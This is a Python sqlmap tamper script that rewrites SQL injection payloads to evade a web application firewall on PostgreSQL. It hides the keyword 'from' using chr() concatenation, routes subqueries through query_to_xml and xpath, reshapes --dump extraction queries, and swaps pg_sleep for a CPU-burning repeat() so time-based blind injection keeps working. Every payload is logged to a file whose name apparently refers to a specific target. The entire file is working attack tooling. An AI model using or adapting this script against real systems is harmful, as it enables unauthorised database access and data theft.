#!/usr/bin/env python3
import re

__priority__ = 100
PER_SECOND = 20_000_000


def _hex2esc(s):
    """0x7162 -> concat(chr(113),chr(98))  (PostgreSQL-valid, JSON-safe)."""
    out, i, n = [], 0, len(s)
    while i < n:
        if s[i:i+2].lower() == "0x":
            j = i + 2
            hexs = ""
            while j < n and s[j] in "0123456789abcdefABCDEF":
                hexs += s[j]; j += 1
            if len(hexs) >= 2:
                if len(hexs) % 2:
                    hexs = "0" + hexs
                chars = ",".join("chr(%d)" % int(hexs[k:k+2], 16)
                                 for k in range(0, len(hexs), 2))
                out.append("concat(%s)" % chars)
                i = j
                continue
        out.append(s[i]); i += 1
    return "".join(out)


def _chr(s):
    return "concat(" + ",".join("chr(%d)" % ord(c) for c in s) + ")"


def _sql_lit(s):
    return "'" + s.replace("'", "''") + "'"


# runtime-built 'from' — WAF never sees the literal keyword
FROM_CHR = "concat(chr(102),chr(114),chr(111),chr(109))"


def _wrap_subquery(inner):
    """Hide literal 'from'; run via query_to_xml and extract scalar via xpath."""
    up = inner.upper()
    depth, idx, i = 0, -1, 0
    while i < len(inner):
        c = inner[i]
        if c == "(":
            depth += 1
        elif c == ")":
            depth -= 1
        elif depth == 0 and up[i:i+6] == " FROM ":
            idx = i; break
        i += 1
    if idx == -1:
        qexpr = _sql_lit(inner)
    else:
        left, right = inner[:idx], inner[idx+6:]
        qexpr = "%s || %s || %s" % (_sql_lit(left + " "), FROM_CHR, _sql_lit(" " + right))
    return "(xpath('/table/row/*/text()', query_to_xml(%s,false,false,'')))[1]::text" % qexpr


def _replace_from_subqueries(s):
    out, i, n = [], 0, len(s)
    while i < n:
        if s[i] == "(":
            depth, j = 0, i
            while j < n:
                if s[j] == "(":
                    depth += 1
                elif s[j] == ")":
                    depth -= 1
                    if depth == 0:
                        break
                j += 1
            if j < n and depth == 0:
                group = s[i+1:j]
                if re.match(r"^\s*SELECT\b", group, flags=re.I) and re.search(r"\bFROM\b", group, flags=re.I):
                    out.append(_wrap_subquery(group))
                else:
                    out.append("(" + _replace_from_subqueries(group) + ")")
                i = j + 1
                continue
        out.append(s[i]); i += 1
    return "".join(out)


def _split_top(s):
    parts, depth, cur = [], 0, ""
    for c in s:
        if c == "(":
            depth += 1
        elif c == ")":
            depth -= 1
        if c == "," and depth == 0:
            parts.append(cur); cur = ""
        else:
            cur += c
    parts.append(cur)
    return parts


def _fix_dump_from(p):
    """sqlmap --dump emits a TOP-LEVEL `SELECT ... FROM <table>` (WAF-blocked).
    Turn each non-NULL column into `(SELECT <col> FROM <table>)` (handled later)."""
    depth, idx, i = 0, -1, 0
    up = p.upper()
    while i < len(p):
        c = p[i]
        if c == "(":
            depth += 1
        elif c == ")":
            depth -= 1
        elif depth == 0 and up[i:i+6] == " FROM ":
            idx = i
        i += 1
    if idx == -1:
        return p
    before, after = p[:idx], p[idx+6:]
    sel = before.upper().rfind("SELECT ")
    if sel == -1:
        return p
    head = before[:sel+7]
    cols = _split_top(before[sel+7:])
    after_s = after.strip()
    _m = re.match(r"([A-Za-z0-9_.]+)", after_s)   # comma/space-safe table name
    if not _m:
        return p
    table = _m.group(1)
    if not table.replace(".", "").replace("_", "").isalnum():
        return p
    tail = after_s[_m.end():]
    newcols, changed = [], False
    for c in cols:
        cs = c.strip()
        if cs.upper() == "NULL" or cs == "":
            newcols.append(c)
        else:
            newcols.append("(SELECT %s FROM %s)" % (cs, table))
            changed = True
    if not changed:
        return p
    return head + ",".join(newcols) + tail


def tamper(payload, **kwargs):
    p = payload
    try:
        _log = open("/tmp/mbanq_tamper.log", "a")
    except Exception:
        _log = None
    try:
        p = _fix_dump_from(p)
        # drop sqlmap's dummy row-generator: FROM (SELECT 0 AS x UNION SELECT 1 ...) AS y
        p = re.sub(r"\s+FROM\s*\(\s*SELECT\s+0\s+AS\s+\w+.*?\)\s+AS\s+\w+", "", p, flags=re.I | re.S)
        p = _hex2esc(p)
        p = re.sub(r"pg_sleep\s*\(\s*([0-9.]+)\s*\)",
                   lambda m: "repeat('a',%d)" % int(float(m.group(1)) * PER_SECOND),
                   p, flags=re.I)
        p = _replace_from_subqueries(p)
    finally:
        if _log:
            try:
                _log.write("IN : %s\nOUT: %s\n\n" % (payload, p))
                _log.close()
            except Exception:
                pass
    return p
